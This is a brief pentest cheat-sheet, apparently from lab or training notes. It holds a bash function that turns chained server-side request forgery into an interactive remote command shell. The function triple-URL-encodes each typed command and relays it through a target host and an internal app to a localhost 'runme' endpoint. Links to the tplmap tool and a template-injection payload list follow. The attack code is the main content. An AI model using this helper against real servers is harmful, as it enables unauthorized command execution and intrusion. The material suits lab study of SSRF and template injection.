## Automate executing commands
```
[!bash!]$ function rce() {
function> while true; do
function while> echo -n "# "; read cmd
function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
function while> echo ""
function while> done
function> }
```


# Useful Links

git clone https://github.com/epinna/tplmap.git
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
